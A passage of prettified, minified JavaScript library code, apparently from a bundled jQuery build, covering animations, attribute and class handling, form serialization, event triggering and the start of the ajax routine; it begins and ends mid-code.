        props: x.extend({}, e),
        opts: x.extend(!0, { specialEasing: {}, easing: x.easing._default }, n),
        originalProperties: e,
        originalOptions: n,
        startTime: tX || tV(),
        duration: n.duration,
        tweens: [],
        createTween: function e(n, i) {
          var o = x.Tween(
            t,
            c.opts,
            n,
            i,
            c.opts.specialEasing[n] || c.opts.easing
          );
          return c.tweens.push(o), o;
        },
        stop: function e(n) {
          var i = 0,
            s = n ? c.tweens.length : 0;
          if (o) return this;
          for (o = !0; i < s; i++) c.tweens[i].run(1);
          return (
            n
              ? (a.notifyWith(t, [c, 1, 0]), a.resolveWith(t, [c, n]))
              : a.rejectWith(t, [c, n]),
            this
          );
        },
      }),
      d = c.props;
    for (
      (function (t, e) {
        var n, i, o, s, r;
        for (n in t)
          if (
            ((o = e[(i = Y(n))]),
            Array.isArray((s = t[n])) && ((o = s[1]), (s = t[n] = s[0])),
            n !== i && ((t[i] = s), delete t[n]),
            (r = x.cssHooks[i]) && ("expand" in r))
          )
            for (n in ((s = r.expand(s)), delete t[i], s))
              (n in t) || ((t[n] = s[n]), (e[n] = o));
          else e[i] = o;
      })(d, c.opts.specialEasing);
      s < r;
      s++
    )
      if ((i = tZ.prefilters[s].call(c, t, d, c.opts)))
        return (
          h(i.stop) &&
            (x._queueHooks(c.elem, c.opts.queue).stop = i.stop.bind(i)),
          i
        );
    return (
      x.map(d, tK, c),
      h(c.opts.start) && c.opts.start.call(t, c),
      c
        .progress(c.opts.progress)
        .done(c.opts.done, c.opts.complete)
        .fail(c.opts.fail)
        .always(c.opts.always),
      x.fx.timer(x.extend(l, { elem: t, anim: c, queue: c.opts.queue })),
      c
    );
  }
  (x.Animation = x.extend(tZ, {
    tweeners: {
      "*": [
        function (t, e) {
          var n = this.createTween(t, e);
          return ta(n.elem, t, te.exec(e), n), n;
        },
      ],
    },
    tweener: function t(e, n) {
      h(e) ? ((n = e), (e = ["*"])) : (e = e.match(q));
      for (var i, o = 0, s = e.length; o < s; o++)
        (i = e[o]),
          (tZ.tweeners[i] = tZ.tweeners[i] || []),
          tZ.tweeners[i].unshift(n);
    },
    prefilters: [
      function (t, e, n) {
        var i,
          o,
          s,
          r,
          a,
          l,
          c,
          d,
          u = "width" in e || "height" in e,
          p = this,
          f = {},
          h = t.style,
          g = t.nodeType && tr(t),
          v = G.get(t, "fxshow");
        for (i in (n.queue ||
          (null == (r = x._queueHooks(t, "fx")).unqueued &&
            ((r.unqueued = 0),
            (a = r.empty.fire),
            (r.empty.fire = function () {
              r.unqueued || a();
            })),
          r.unqueued++,
          p.always(function () {
            p.always(function () {
              r.unqueued--, x.queue(t, "fx").length || r.empty.fire();
            });
          })),
        e))
          if (((o = e[i]), tY.test(o))) {
            if (
              (delete e[i],
              (s = s || "toggle" === o),
              o === (g ? "hide" : "show"))
            ) {
              if ("show" !== o || !v || void 0 === v[i]) continue;
              g = !0;
            }
            f[i] = (v && v[i]) || x.style(t, i);
          }
        if ((l = !x.isEmptyObject(e)) || !x.isEmptyObject(f))
          for (i in (u &&
            1 === t.nodeType &&
            ((n.overflow = [h.overflow, h.overflowX, h.overflowY]),
            null == (c = v && v.display) && (c = G.get(t, "display")),
            "none" === (d = x.css(t, "display")) &&
              (c
                ? (d = c)
                : (td([t], !0),
                  (c = t.style.display || c),
                  (d = x.css(t, "display")),
                  td([t]))),
            ("inline" === d || ("inline-block" === d && null != c)) &&
              "none" === x.css(t, "float") &&
              (l ||
                (p.done(function () {
                  h.display = c;
                }),
                null == c && (c = "none" === (d = h.display) ? "" : d)),
              (h.display = "inline-block"))),
          n.overflow &&
            ((h.overflow = "hidden"),
            p.always(function () {
              (h.overflow = n.overflow[0]),
                (h.overflowX = n.overflow[1]),
                (h.overflowY = n.overflow[2]);
            })),
          (l = !1),
          f))
            l ||
              (v
                ? "hidden" in v && (g = v.hidden)
                : (v = G.access(t, "fxshow", { display: c })),
              s && (v.hidden = !g),
              g && td([t], !0),
              p.done(function () {
                for (i in (g || td([t]), G.remove(t, "fxshow"), f))
                  x.style(t, i, f[i]);
              })),
              (l = tK(g ? v[i] : 0, i, p)),
              i in v ||
                ((v[i] = l.start), g && ((l.end = l.start), (l.start = 0)));
      },
    ],
    prefilter: function t(e, n) {
      n ? tZ.prefilters.unshift(e) : tZ.prefilters.push(e);
    },
  })),
    (x.speed = function (t, e, n) {
      var i =
        t && "object" == _typeof(t)
          ? x.extend({}, t)
          : {
              complete: n || (!n && e) || (h(t) && t),
              duration: t,
              easing: (n && e) || (e && !h(e) && e),
            };
      return (
        x.fx.off
          ? (i.duration = 0)
          : "number" != typeof i.duration &&
            (i.duration in x.fx.speeds
              ? (i.duration = x.fx.speeds[i.duration])
              : (i.duration = x.fx.speeds._default)),
        (null != i.queue && !0 !== i.queue) || (i.queue = "fx"),
        (i.old = i.complete),
        (i.complete = function () {
          h(i.old) && i.old.call(this), i.queue && x.dequeue(this, i.queue);
        }),
        i
      );
    }),
    x.fn.extend({
      fadeTo: function t(e, n, i, o) {
        return this.filter(tr)
          .css("opacity", 0)
          .show()
          .end()
          .animate({ opacity: n }, e, i, o);
      },
      animate: function t(e, n, i, o) {
        var s = x.isEmptyObject(e),
          r = x.speed(n, i, o),
          a = function t() {
            var n = tZ(this, x.extend({}, e), r);
            (s || G.get(this, "finish")) && n.stop(!0);
          };
        return (
          (a.finish = a),
          s || !1 === r.queue ? this.each(a) : this.queue(r.queue, a)
        );
      },
      stop: function t(e, n, i) {
        var o = function t(e) {
          var n = e.stop;
          delete e.stop, n(i);
        };
        return (
          "string" != typeof e && ((i = n), (n = e), (e = void 0)),
          n && this.queue(e || "fx", []),
          this.each(function () {
            var t = !0,
              n = null != e && e + "queueHooks",
              s = x.timers,
              r = G.get(this);
            if (n) r[n] && r[n].stop && o(r[n]);
            else for (n in r) r[n] && r[n].stop && tU.test(n) && o(r[n]);
            for (n = s.length; n--; )
              s[n].elem !== this ||
                (null != e && s[n].queue !== e) ||
                (s[n].anim.stop(i), (t = !1), s.splice(n, 1));
            (!t && i) || x.dequeue(this, e);
          })
        );
      },
      finish: function t(e) {
        return (
          !1 !== e && (e = e || "fx"),
          this.each(function () {
            var t,
              n = G.get(this),
              i = n[e + "queue"],
              o = n[e + "queueHooks"],
              s = x.timers,
              r = i ? i.length : 0;
            for (
              n.finish = !0,
                x.queue(this, e, []),
                o && o.stop && o.stop.call(this, !0),
                t = s.length;
              t--;

            )
              s[t].elem === this &&
                s[t].queue === e &&
                (s[t].anim.stop(!0), s.splice(t, 1));
            for (t = 0; t < r; t++)
              i[t] && i[t].finish && i[t].finish.call(this);
            delete n.finish;
          })
        );
      },
    }),
    x.each(["toggle", "show", "hide"], function (t, e) {
      var n = x.fn[e];
      x.fn[e] = function (t, i, o) {
        return null == t || "boolean" == typeof t
          ? n.apply(this, arguments)
          : this.animate(tG(e, !0), t, i, o);
      };
    }),
    x.each(
      {
        slideDown: tG("show"),
        slideUp: tG("hide"),
        slideToggle: tG("toggle"),
        fadeIn: { opacity: "show" },
        fadeOut: { opacity: "hide" },
        fadeToggle: { opacity: "toggle" },
      },
      function (t, e) {
        x.fn[t] = function (t, n, i) {
          return this.animate(e, t, n, i);
        };
      }
    ),
    (x.timers = []),
    (x.fx.tick = function () {
      var t,
        e = 0,
        n = x.timers;
      for (tX = Date.now(); e < n.length; e++)
        (t = n[e])() || n[e] !== t || n.splice(e--, 1);
      n.length || x.fx.stop(), (tX = void 0);
    }),
    (x.fx.timer = function (t) {
      x.timers.push(t), x.fx.start();
    }),
    (x.fx.interval = 13),
    (x.fx.start = function () {
      t6 ||
        ((t6 = !0),
        (function e() {
          t6 &&
            (!1 === v.hidden && t.requestAnimationFrame
              ? t.requestAnimationFrame(e)
              : t.setTimeout(e, x.fx.interval),
            x.fx.tick());
        })());
    }),
    (x.fx.stop = function () {
      t6 = null;
    }),
    (x.fx.speeds = { slow: 600, fast: 200, _default: 400 }),
    (x.fn.delay = function (e, n) {
      return (
        (e = (x.fx && x.fx.speeds[e]) || e),
        (n = n || "fx"),
        this.queue(n, function (n, i) {
          var o = t.setTimeout(n, e);
          i.stop = function () {
            t.clearTimeout(o);
          };
        })
      );
    }),
    (tJ = v.createElement("input")),
    (tQ = v.createElement("select").appendChild(v.createElement("option"))),
    (tJ.type = "checkbox"),
    (f.checkOn = "" !== tJ.value),
    (f.optSelected = tQ.selected),
    ((tJ = v.createElement("input")).value = "t"),
    (tJ.type = "radio"),
    (f.radioValue = "t" === tJ.value);
  var tJ,
    tQ,
    et,
    ee = x.expr.attrHandle;
  x.fn.extend({
    attr: function t(e, n) {
      return R(this, x.attr, e, n, arguments.length > 1);
    },
    removeAttr: function t(e) {
      return this.each(function () {
        x.removeAttr(this, e);
      });
    },
  }),
    x.extend({
      attr: function t(e, n, i) {
        var o,
          s,
          r = e.nodeType;
        if (3 !== r && 8 !== r && 2 !== r)
          return void 0 === e.getAttribute
            ? x.prop(e, n, i)
            : ((1 === r && x.isXMLDoc(e)) ||
                (s =
                  x.attrHooks[n.toLowerCase()] ||
                  (x.expr.match.bool.test(n) ? et : void 0)),
              void 0 !== i
                ? null === i
                  ? void x.removeAttr(e, n)
                  : s && "set" in s && void 0 !== (o = s.set(e, i, n))
                  ? o
                  : (e.setAttribute(n, i + ""), i)
                : s && "get" in s && null !== (o = s.get(e, n))
                ? o
                : null == (o = x.find.attr(e, n))
                ? void 0
                : o);
      },
      attrHooks: {
        type: {
          set: function t(e, n) {
            if (!f.radioValue && "radio" === n && k(e, "input")) {
              var i = e.value;
              return e.setAttribute("type", n), i && (e.value = i), n;
            }
          },
        },
      },
      removeAttr: function t(e, n) {
        var i,
          o = 0,
          s = n && n.match(q);
        if (s && 1 === e.nodeType) for (; (i = s[o++]); ) e.removeAttribute(i);
      },
    }),
    (et = {
      set: function t(e, n, i) {
        return !1 === n ? x.removeAttr(e, i) : e.setAttribute(i, i), i;
      },
    }),
    x.each(x.expr.match.bool.source.match(/\w+/g), function (t, e) {
      var n = ee[e] || x.find.attr;
      ee[e] = function (t, e, i) {
        var o,
          s,
          r = e.toLowerCase();
        return (
          i ||
            ((s = ee[r]),
            (ee[r] = o),
            (o = null != n(t, e, i) ? r : null),
            (ee[r] = s)),
          o
        );
      };
    });
  var en = /^(?:input|select|textarea|button)$/i,
    ei = /^(?:a|area)$/i;
  function eo(t) {
    return (t.match(q) || []).join(" ");
  }
  function es(t) {
    return (t.getAttribute && t.getAttribute("class")) || "";
  }
  function er(t) {
    return Array.isArray(t) ? t : ("string" == typeof t && t.match(q)) || [];
  }
  x.fn.extend({
    prop: function t(e, n) {
      return R(this, x.prop, e, n, arguments.length > 1);
    },
    removeProp: function t(e) {
      return this.each(function () {
        delete this[x.propFix[e] || e];
      });
    },
  }),
    x.extend({
      prop: function t(e, n, i) {
        var o,
          s,
          r = e.nodeType;
        if (3 !== r && 8 !== r && 2 !== r)
          return (
            (1 === r && x.isXMLDoc(e)) ||
              ((n = x.propFix[n] || n), (s = x.propHooks[n])),
            void 0 !== i
              ? s && "set" in s && void 0 !== (o = s.set(e, i, n))
                ? o
                : (e[n] = i)
              : s && "get" in s && null !== (o = s.get(e, n))
              ? o
              : e[n]
          );
      },
      propHooks: {
        tabIndex: {
          get: function t(e) {
            var n = x.find.attr(e, "tabindex");
            return n
              ? parseInt(n, 10)
              : en.test(e.nodeName) || (ei.test(e.nodeName) && e.href)
              ? 0
              : -1;
          },
        },
      },
      propFix: { for: "htmlFor", class: "className" },
    }),
    f.optSelected ||
      (x.propHooks.selected = {
        get: function t(e) {
          var n = e.parentNode;
          return n && n.parentNode && n.parentNode.selectedIndex, null;
        },
        set: function t(e) {
          var n = e.parentNode;
          n && (n.selectedIndex, n.parentNode && n.parentNode.selectedIndex);
        },
      }),
    x.each(
      [
        "tabIndex",
        "readOnly",
        "maxLength",
        "cellSpacing",
        "cellPadding",
        "rowSpan",
        "colSpan",
        "useMap",
        "frameBorder",
        "contentEditable",
      ],
      function () {
        x.propFix[this.toLowerCase()] = this;
      }
    ),
    x.fn.extend({
      addClass: function t(e) {
        var n,
          i,
          o,
          s,
          r,
          a,
          l,
          c = 0;
        if (h(e))
          return this.each(function (t) {
            x(this).addClass(e.call(this, t, es(this)));
          });
        if ((n = er(e)).length) {
          for (; (i = this[c++]); )
            if (((s = es(i)), (o = 1 === i.nodeType && " " + eo(s) + " "))) {
              for (a = 0; (r = n[a++]); )
                0 > o.indexOf(" " + r + " ") && (o += r + " ");
              s !== (l = eo(o)) && i.setAttribute("class", l);
            }
        }
        return this;
      },
      removeClass: function t(e) {
        var n,
          i,
          o,
          s,
          r,
          a,
          l,
          c = 0;
        if (h(e))
          return this.each(function (t) {
            x(this).removeClass(e.call(this, t, es(this)));
          });
        if (!arguments.length) return this.attr("class", "");
        if ((n = er(e)).length) {
          for (; (i = this[c++]); )
            if (((s = es(i)), (o = 1 === i.nodeType && " " + eo(s) + " "))) {
              for (a = 0; (r = n[a++]); )
                for (; o.indexOf(" " + r + " ") > -1; )
                  o = o.replace(" " + r + " ", " ");
              s !== (l = eo(o)) && i.setAttribute("class", l);
            }
        }
        return this;
      },
      toggleClass: function t(e, n) {
        var i = _typeof(e),
          o = "string" === i || Array.isArray(e);
        return "boolean" == typeof n && o
          ? n
            ? this.addClass(e)
            : this.removeClass(e)
          : h(e)
          ? this.each(function (t) {
              x(this).toggleClass(e.call(this, t, es(this), n), n);
            })
          : this.each(function () {
              var t, n, s, r;
              if (o)
                for (n = 0, s = x(this), r = er(e); (t = r[n++]); )
                  s.hasClass(t) ? s.removeClass(t) : s.addClass(t);
              else
                (void 0 !== e && "boolean" !== i) ||
                  ((t = es(this)) && G.set(this, "__className__", t),
                  this.setAttribute &&
                    this.setAttribute(
                      "class",
                      t || !1 === e ? "" : G.get(this, "__className__") || ""
                    ));
            });
      },
      hasClass: function t(e) {
        var n,
          i,
          o = 0;
        for (n = " " + e + " "; (i = this[o++]); )
          if (1 === i.nodeType && (" " + eo(es(i)) + " ").indexOf(n) > -1)
            return !0;
        return !1;
      },
    });
  var ea = /\r/g;
  x.fn.extend({
    val: function t(e) {
      var n,
        i,
        o,
        s = this[0];
      return arguments.length
        ? ((o = h(e)),
          this.each(function (t) {
            var i;
            1 === this.nodeType &&
              (null == (i = o ? e.call(this, t, x(this).val()) : e)
                ? (i = "")
                : "number" == typeof i
                ? (i += "")
                : Array.isArray(i) &&
                  (i = x.map(i, function (t) {
                    return null == t ? "" : t + "";
                  })),
              ((n =
                x.valHooks[this.type] ||
                x.valHooks[this.nodeName.toLowerCase()]) &&
                "set" in n &&
                void 0 !== n.set(this, i, "value")) ||
                (this.value = i));
          }))
        : s
        ? (n = x.valHooks[s.type] || x.valHooks[s.nodeName.toLowerCase()]) &&
          "get" in n &&
          void 0 !== (i = n.get(s, "value"))
          ? i
          : "string" == typeof (i = s.value)
          ? i.replace(ea, "")
          : null == i
          ? ""
          : i
        : void 0;
    },
  }),
    x.extend({
      valHooks: {
        option: {
          get: function t(e) {
            var n = x.find.attr(e, "value");
            return null != n ? n : eo(x.text(e));
          },
        },
        select: {
          get: function t(e) {
            var n,
              i,
              o,
              s = e.options,
              r = e.selectedIndex,
              a = "select-one" === e.type,
              l = a ? null : [],
              c = a ? r + 1 : s.length;
            for (o = r < 0 ? c : a ? r : 0; o < c; o++)
              if (
                ((i = s[o]).selected || o === r) &&
                !i.disabled &&
                (!i.parentNode.disabled || !k(i.parentNode, "optgroup"))
              ) {
                if (((n = x(i).val()), a)) return n;
                l.push(n);
              }
            return l;
          },
          set: function t(e, n) {
            for (
              var i, o, s = e.options, r = x.makeArray(n), a = s.length;
              a--;

            )
              ((o = s[a]).selected =
                x.inArray(x.valHooks.option.get(o), r) > -1) && (i = !0);
            return i || (e.selectedIndex = -1), r;
          },
        },
      },
    }),
    x.each(["radio", "checkbox"], function () {
      (x.valHooks[this] = {
        set: function t(e, n) {
          if (Array.isArray(n))
            return (e.checked = x.inArray(x(e).val(), n) > -1);
        },
      }),
        f.checkOn ||
          (x.valHooks[this].get = function (t) {
            return null === t.getAttribute("value") ? "on" : t.value;
          });
    }),
    (f.focusin = "onfocusin" in t);
  var el = /^(?:focusinfocus|focusoutblur)$/,
    ec = function t(e) {
      e.stopPropagation();
    };
  x.extend(x.event, {
    trigger: function e(n, i, o, s) {
      var r,
        a,
        l,
        c,
        u,
        p,
        f,
        m,
        y = [o || v],
        b = d.call(n, "type") ? n.type : n,
        _ = d.call(n, "namespace") ? n.namespace.split(".") : [];
      if (
        ((a = m = l = o = o || v),
        3 !== o.nodeType &&
          8 !== o.nodeType &&
          !el.test(b + x.event.triggered) &&
          (b.indexOf(".") > -1 && ((b = (_ = b.split(".")).shift()), _.sort()),
          (u = 0 > b.indexOf(":") && "on" + b),
          ((n = n[x.expando]
            ? n
            : new x.Event(b, "object" == _typeof(n) && n)).isTrigger = s
            ? 2
            : 3),
          (n.namespace = _.join(".")),
          (n.rnamespace = n.namespace
            ? RegExp("(^|\\.)" + _.join("\\.(?:.*\\.|)") + "(\\.|$)")
            : null),
          (n.result = void 0),
          n.target || (n.target = o),
          (i = null == i ? [n] : x.makeArray(i, [n])),
          (f = x.event.special[b] || {}),
          s || !f.trigger || !1 !== f.trigger.apply(o, i)))
      ) {
        if (!s && !f.noBubble && !g(o)) {
          for (
            c = f.delegateType || b, el.test(c + b) || (a = a.parentNode);
            a;
            a = a.parentNode
          )
            y.push(a), (l = a);
          l === (o.ownerDocument || v) &&
            y.push(l.defaultView || l.parentWindow || t);
        }
        for (r = 0; (a = y[r++]) && !n.isPropagationStopped(); )
          (m = a),
            (n.type = r > 1 ? c : f.bindType || b),
            (p =
              (G.get(a, "events") || Object.create(null))[n.type] &&
              G.get(a, "handle")) && p.apply(a, i),
            (p = u && a[u]) &&
              p.apply &&
              U(a) &&
              ((n.result = p.apply(a, i)),
              !1 === n.result && n.preventDefault());
        return (
          (n.type = b),
          s ||
            n.isDefaultPrevented() ||
            (f._default && !1 !== f._default.apply(y.pop(), i)) ||
            !U(o) ||
            (u &&
              h(o[b]) &&
              !g(o) &&
              ((l = o[u]) && (o[u] = null),
              (x.event.triggered = b),
              n.isPropagationStopped() && m.addEventListener(b, ec),
              o[b](),
              n.isPropagationStopped() && m.removeEventListener(b, ec),
              (x.event.triggered = void 0),
              l && (o[u] = l))),
          n.result
        );
      }
    },
    simulate: function t(e, n, i) {
      var o = x.extend(new x.Event(), i, { type: e, isSimulated: !0 });
      x.event.trigger(o, null, n);
    },
  }),
    x.fn.extend({
      trigger: function t(e, n) {
        return this.each(function () {
          x.event.trigger(e, n, this);
        });
      },
      triggerHandler: function t(e, n) {
        var i = this[0];
        if (i) return x.event.trigger(e, n, i, !0);
      },
    }),
    f.focusin ||
      x.each({ focus: "focusin", blur: "focusout" }, function (t, e) {
        var n = function t(n) {
          x.event.simulate(e, n.target, x.event.fix(n));
        };
        x.event.special[e] = {
          setup: function i() {
            var o = this.ownerDocument || this.document || this,
              s = G.access(o, e);
            s || o.addEventListener(t, n, !0), G.access(o, e, (s || 0) + 1);
          },
          teardown: function i() {
            var o = this.ownerDocument || this.document || this,
              s = G.access(o, e) - 1;
            s
              ? G.access(o, e, s)
              : (o.removeEventListener(t, n, !0), G.remove(o, e));
          },
        };
      });
  var ed = t.location,
    eu = { guid: Date.now() },
    ep = /\?/;
  x.parseXML = function (e) {
    var n, i;
    if (!e || "string" != typeof e) return null;
    try {
      n = new t.DOMParser().parseFromString(e, "text/xml");
    } catch (o) {}
    return (
      (i = n && n.getElementsByTagName("parsererror")[0]),
      (n && !i) ||
        x.error(
          "Invalid XML: " +
            (i
              ? x
                  .map(i.childNodes, function (t) {
                    return t.textContent;
                  })
                  .join("\n")
              : e)
        ),
      n
    );
  };
  var ef = /\[\]$/,
    eh = /\r?\n/g,
    eg = /^(?:submit|button|image|reset|file)$/i,
    ev = /^(?:input|select|textarea|keygen)/i;
  function em(t, e, n, i) {
    var o;
    if (Array.isArray(e))
      x.each(e, function (e, o) {
        n || ef.test(t)
          ? i(t, o)
          : em(
              t + "[" + ("object" == _typeof(o) && null != o ? e : "") + "]",
              o,
              n,
              i
            );
      });
    else if (n || "object" !== b(e)) i(t, e);
    else for (o in e) em(t + "[" + o + "]", e[o], n, i);
  }
  (x.param = function (t, e) {
    var n,
      i = [],
      o = function t(e, n) {
        var o = h(n) ? n() : n;
        i[i.length] =
          encodeURIComponent(e) + "=" + encodeURIComponent(null == o ? "" : o);
      };
    if (null == t) return "";
    if (Array.isArray(t) || (t.jquery && !x.isPlainObject(t)))
      x.each(t, function () {
        o(this.name, this.value);
      });
    else for (n in t) em(n, t[n], e, o);
    return i.join("&");
  }),
    x.fn.extend({
      serialize: function t() {
        return x.param(this.serializeArray());
      },
      serializeArray: function t() {
        return this.map(function () {
          var t = x.prop(this, "elements");
          return t ? x.makeArray(t) : this;
        })
          .filter(function () {
            var t = this.type;
            return (
              this.name &&
              !x(this).is(":disabled") &&
              ev.test(this.nodeName) &&
              !eg.test(t) &&
              (this.checked || !tf.test(t))
            );
          })
          .map(function (t, e) {
            var n = x(this).val();
            return null == n
              ? null
              : Array.isArray(n)
              ? x.map(n, function (t) {
                  return { name: e.name, value: t.replace(eh, "\r\n") };
                })
              : { name: e.name, value: n.replace(eh, "\r\n") };
          })
          .get();
      },
    });
  var ey = /%20/g,
    e$ = /#.*$/,
    eb = /([?&])_=[^&]*/,
    ex = /^(.*?):[ \t]*([^\r\n]*)$/gm,
    e_ = /^(?:GET|HEAD)$/,
    ew = /^\/\//,
    eT = {},
    eS = {},
    eC = "*/".concat("*"),
    ek = v.createElement("a");
  function e9(t) {
    return function (e, n) {
      "string" != typeof e && ((n = e), (e = "*"));
      var i,
        o = 0,
        s = e.toLowerCase().match(q) || [];
      if (h(n))
        for (; (i = s[o++]); )
          "+" === i[0]
            ? (t[(i = i.slice(1) || "*")] = t[i] || []).unshift(n)
            : (t[i] = t[i] || []).push(n);
    };
  }
  function eA(t, e, n, i) {
    var o = {},
      s = t === eS;
    function r(a) {
      var l;
      return (
        (o[a] = !0),
        x.each(t[a] || [], function (t, a) {
          var c = a(e, n, i);
          return "string" != typeof c || s || o[c]
            ? s
              ? !(l = c)
              : void 0
            : (e.dataTypes.unshift(c), r(c), !1);
        }),
        l
      );
    }
    return r(e.dataTypes[0]) || (!o["*"] && r("*"));
  }
  function eP(t, e) {
    var n,
      i,
      o = x.ajaxSettings.flatOptions || {};
    for (n in e) void 0 !== e[n] && ((o[n] ? t : i || (i = {}))[n] = e[n]);
    return i && x.extend(!0, t, i), t;
  }
  (ek.href = ed.href),
    x.extend({
      active: 0,
      lastModified: {},
      etag: {},
      ajaxSettings: {
        url: ed.href,
        type: "GET",
        isLocal:
          /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(
            ed.protocol
          ),
        global: !0,
        processData: !0,
        async: !0,
        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
        accepts: {
          "*": eC,
          text: "text/plain",
          html: "text/html",
          xml: "application/xml, text/xml",
          json: "application/json, text/javascript",
        },
        contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ },
        responseFields: {
          xml: "responseXML",
          text: "responseText",
          json: "responseJSON",
        },
        converters: {
          "* text": String,
          "text html": !0,
          "text json": JSON.parse,
          "text xml": x.parseXML,
        },
        flatOptions: { url: !0, context: !0 },
      },
      ajaxSetup: function t(e, n) {
        return n ? eP(eP(e, x.ajaxSettings), n) : eP(x.ajaxSettings, e);
      },
      ajaxPrefilter: e9(eT),
      ajaxTransport: e9(eS),
      ajax: function e(n, i) {
        "object" == _typeof(n) && ((i = n), (n = void 0)), (i = i || {});
        var o,
          s,
          r,
          a,
          l,
          c,
          d,
          u,
          p,
          f,
          h = x.ajaxSetup({}, i),
          g = h.context || h,
          m = h.context && (g.nodeType || g.jquery) ? x(g) : x.event,
          y = x.Deferred(),
          b = x.Callbacks("once memory"),
          _ = h.statusCode || {},
          w = {},
          T = {},
          S = "canceled",
          C = {
            readyState: 0,
            getResponseHeader: function t(e) {
              var n;
              if (d) {
                if (!a)
                  for (a = {}; (n = ex.exec(r)); )
                    a[n[1].toLowerCase() + " "] = (
                      a[n[1].toLowerCase() + " "] || []
                    ).concat(n[2]);
                n = a[e.toLowerCase() + " "];
              }
              return null == n ? null : n.join(", ");
            },
            getAllResponseHeaders: function t() {
              return d ? r : null;
            },
            setRequestHeader: function t(e, n) {
              return (
                null == d &&
                  (w[(e = T[e.toLowerCase()] = T[e.toLowerCase()] || e)] = n),
                this
              );
            },
            overrideMimeType: function t(e) {
              return null == d && (h.mimeType = e), this;
            },
            statusCode: function t(e) {
              var n;
              if (e) {
                if (d) C.always(e[C.status]);
                else for (n in e) _[n] = [_[n], e[n]];
              }
              return this;
            },
            abort: function t(e) {
              var n = e || S;
              return o && o.abort(n), P(0, n), this;
            },
          };
        if (
          (y.promise(C),
          (h.url = ((n || h.url || ed.href) + "").replace(
            ew,
            ed.protocol + "//"
          )),
          (h.type = i.method || i.type || h.method || h.type),
          (h.dataTypes = (h.dataType || "*").toLowerCase().match(q) || [""]),
          null == h.crossDomain)
        ) {
          c = v.createElement("a");
          try {
            (c.href = h.url),
              (c.href = c.href),
              (h.crossDomain =
                ek.protocol + "//" + ek.host != c.protocol + "//" + c.host);
          } catch (k) {
            h.crossDomain = !0;
          }
        }
        if (
          (h.data &&
            h.processData &&
            "string" != typeof h.data &&
            (h.data = x.param(h.data, h.traditional)),
          eA(eT, h, i, C),
          d)
        )
          return C;
        for (p in ((u = x.event && h.global) &&
          0 == x.active++ &&
          x.event.trigger("ajaxStart"),
        (h.type = h.type.toUpperCase()),
        (h.hasContent = !e_.test(h.type)),
        (s = h.url.replace(e$, "")),
        h.hasContent
          ? h.data &&
            h.processData &&
            0 ===
              (h.contentType || "").indexOf(
                "application/x-www-form-urlencoded"
              ) &&
            (h.data = h.data.replace(ey, "+"))
          : ((f = h.url.slice(s.length)),
            h.data &&
              (h.processData || "string" == typeof h.data) &&
              ((s += (ep.test(s) ? "&" : "?") + h.data), delete h.data),
            !1 === h.cache &&
              ((s = s.replace(eb, "$1")),
              (f = (ep.test(s) ? "&" : "?") + "_=" + eu.guid++ + f)),
            (h.url = s + f)),
        h.ifModified &&
          (x.lastModified[s] &&
            C.setRequestHeader("If-Modified-Since", x.lastModified[s]),
          x.etag[s] && C.setRequestHeader("If-None-Match", x.etag[s])),
        ((h.data && h.hasContent && !1 !== h.contentType) || i.contentType) &&
          C.setRequestHeader("Content-Type", h.contentType),
        C.setRequestHeader(
          "Accept",
          h.dataTypes[0] && h.accepts[h.dataTypes[0]]
            ? h.accepts[h.dataTypes[0]] +
                ("*" !== h.dataTypes[0] ? ", " + eC + "; q=0.01" : "")
            : h.accepts["*"]
        ),
        h.headers))
          C.setRequestHeader(p, h.headers[p]);
        if (h.beforeSend && (!1 === h.beforeSend.call(g, C, h) || d))
          return C.abort();
        if (
          ((S = "abort"),
          b.add(h.complete),
          C.done(h.success),
          C.fail(h.error),
          (o = eA(eS, h, i, C)))
        ) {
          if (((C.readyState = 1), u && m.trigger("ajaxSend", [C, h]), d))
            return C;
          h.async &&
            h.timeout > 0 &&
            (l = t.setTimeout(function () {
              C.abort("timeout");
            }, h.timeout));
          try {
            (d = !1), o.send(w, P);
          } catch (A) {
            if (d) throw A;
            P(-1, A);
          }
        } else P(-1, "No Transport");
        function P(e, n, i, a) {
          var c,
            p,
            f,
            v,
            w,
            T = n;
          d ||
            ((d = !0),
            l && t.clearTimeout(l),
            (o = void 0),
            (r = a || ""),
            (C.readyState = e > 0 ? 4 : 0),
            (c = (e >= 200 && e < 300) || 304 === e),
            i &&
              (v = (function (t, e, n) {
                for (
                  var i, o, s, r, a = t.contents, l = t.dataTypes;
                  "*" === l[0];

                )
                  l.shift(),
                    void 0 === i &&
                      (i = t.mimeType || e.getResponseHeader("Content-Type"));
                if (i) {
                  for (o in a)
                    if (a[o] && a[o].test(i)) {
                      l.unshift(o);
                      break;
                    }
                }
                if (l[0] in n) s = l[0];
                else {
                  for (o in n) {
                    if (!l[0] || t.converters[o + " " + l[0]]) {
                      s = o;
                      break;
                    }
                    r || (r = o);
                  }
                  s = s || r;
                }
                if (s) return s !== l[0] && l.unshift(s), n[s];
              })(h, C, i)),
            !c &&
              x.inArray("script", h.dataTypes) > -1 &&
              0 > x.inArray("json", h.dataTypes) &&
              (h.converters["text script"] = function () {}),
            (v = (function (t, e, n, i) {
              var o,
                s,
                r,
                a,
                l,
                c = {},
                d = t.dataTypes.slice();
              if (d[1])
                for (r in t.converters) c[r.toLowerCase()] = t.converters[r];
              for (s = d.shift(); s; )
                if (
                  (t.responseFields[s] && (n[t.responseFields[s]] = e),
                  !l && i && t.dataFilter && (e = t.dataFilter(e, t.dataType)),
                  (l = s),
                  (s = d.shift()))
                ) {
                  if ("*" === s) s = l;
                  else if ("*" !== l && l !== s) {
                    if (!(r = c[l + " " + s] || c["* " + s])) {
                      for (o in c)
                        if (
                          (a = o.split(" "))[1] === s &&
                          (r = c[l + " " + a[0]] || c["* " + a[0]])
                        ) {
                          !0 === r
                            ? (r = c[o])
                            : !0 !== c[o] && ((s = a[0]), d.unshift(a[1]));
                          break;
                        }
                    }
                    if (!0 !== r) {
                      if (r && t.throws) e = r(e);
                      else
                        try {
                          e = r(e);
                        } catch (u) {
                          return {
                            state: "parsererror",
                            error: r
                              ? u
                              : "No conversion from " + l + " to " + s,
                          };
                        }
                    }
                  }
                }
              return { state: "success", data: e };
            })(h, v, C, c)),
            c
              ? (h.ifModified &&
                  ((w = C.getResponseHeader("Last-Modified")) &&
                    (x.lastModified[s] = w),
                  (w = C.getResponseHeader("etag")) && (x.etag[s] = w)),
                204 === e || "HEAD" === h.type
